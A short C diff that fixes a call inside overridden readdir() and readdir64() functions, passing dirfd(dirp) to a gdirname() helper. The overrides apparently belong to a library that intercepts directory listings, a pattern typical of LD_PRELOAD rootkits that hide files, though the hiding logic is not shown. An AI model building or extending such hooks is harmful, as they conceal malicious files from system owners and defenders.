@@ -11,7 +11,7 @@ struct dirent *readdir(DIR *dirp){
         if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
 
-        filename = gdirname(dirp);
+        filename = gdirname(dirfd(dirp));
         pathlen = strlen(filename) +
                   strlen(dir->d_name) + 2;
 
@@ -46,7 +46,7 @@ struct dirent64 *readdir64(DIR *dirp){
         if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
 
-        filename = gdirname(dirp);
+        filename = gdirname(dirfd(dirp));
         pathlen = strlen(filename) +
                   strlen(dir->d_name) + 2;
 
